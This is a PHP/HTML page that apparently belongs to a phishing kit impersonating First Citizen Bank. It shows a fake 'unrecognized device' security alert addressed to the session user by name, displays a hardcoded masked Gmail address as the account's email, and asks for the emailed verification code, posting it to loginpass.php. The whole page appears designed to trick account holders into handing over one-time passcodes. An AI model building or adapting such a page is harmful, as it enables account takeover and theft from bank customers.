<?php
session_start();

if (empty($_SESSION["CODE"])) {
    die("unAuthorized access");
}

// $err = $_SESSION["ERROR"];

if (!empty($_SESSION["ERROR"])) {
    $err = $_SESSION["ERROR"];
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account verification</title>
    <link rel="shortcut icon" href="./images/fcb usa.png" type="image/x-icon">
    <!-- bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <!-- ----- --- Font-awesome ---- -----  -->
    <link rel="stylesheet" href="./fontawesome-free-6.3.0-web/css/fontawesome.css">
    <link rel="stylesheet" href="./fontawesome-free-6.3.0-web/css/brands.css">
    <link rel="stylesheet" href="./fontawesome-free-6.3.0-web/css/solid.css">
    <link rel="stylesheet" href="./fontawesome-free-6.3.0-web/css/all.css">
</head>

<body>
    <div class="container-fluid p-3">
        <div class="container p-3">
            <div class="card p-3">
                <div class="card-title">
                    <img src="./dashboard/images/logo.png" alt="logo">
                </div>

                <div class="card-body p-2">
                    <cite>
                        <span class="fw-bold"> Dear, </span> <?php echo ($_SESSION["USER"]['first_name'] . " " . $_SESSION["USER"]['last_name'])  ?>
                    </cite>
                    <p class="text-danger card-text">
                        This is an automated security notification from First Citizen Bank. We recently noticed an attempt to log in to your online banking account from an unrecognized device.
                    </p>
                    <p class="text-danger card-text">
                        For your security, we have blocked the login attempt and have added extra security measures to your account.
                    </p>
                    <p class="text-warning card-text">
                        If you did not attempt to log in to your account, please contact us immediately.
                    </p>
                </div>
                <div class="card-body p-3">
                    <div class="p-4">
                        <form action="./loginpass.php" method="post">
                            <div class="mb-3">
                                <label for="basic-url" class="form-label">Please Enter the Verification Code that was provided to the account's registered email address.</label>
                                <div class="input-group">
                                    <span class="input-group-text" id="basic-addon3">verified.normanree***@gmail.com</span>
                                    <input type="text" class="form-control" name="code" placeholder="Please enter code here with no space(s)..." id="basic-url" aria-describedby="basic-addon3" required />
                                </div>
                                <div class="form-text text-info">Please Check your inbox or Spam messages in your E-mail for OTP.
                                    <label for="spinners">
                                        <div class="spinner-border spinner-border-sm" role="status">
                                            <span class="visually-hidden">Loading...</span>
                                        </div>
                                        <div class="spinner-grow spinner-grow-sm" role="status">
                                            <span class="visually-hidden">Loading...</span>
                                        </div>
                                    </label>
                                </div>
                            </div>
                            <button name="s-code" type="submit" class="btn btn-success">Submit</button>
                        </form>
                        <p style="color:red; text-align: center; font-size: 20px;">
                            <?php
                            if (!empty($err)) {
                                echo ($err);
                                $_SESSION["ERROR"] = "";
                            }
                            ?>
                        </p>
                    </div>

                </div>
            </div>
        </div>
    </div>


    <!-- ------ Conflict detect against Awesome fonts ------ -->
    <script type="text/javascript" src="https://example.com/fontawesome/v6.3.0/js/conflict-detection.js">
    </script>
    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js" integrity="sha384-mQ93GR66B00ZXjt0YO5KlohRA5SY2XofN4zfuZxLkoj1gXtW8ANNCe9d5Y3eG5eD" crossorigin="anonymous"></script>
</body>

</html>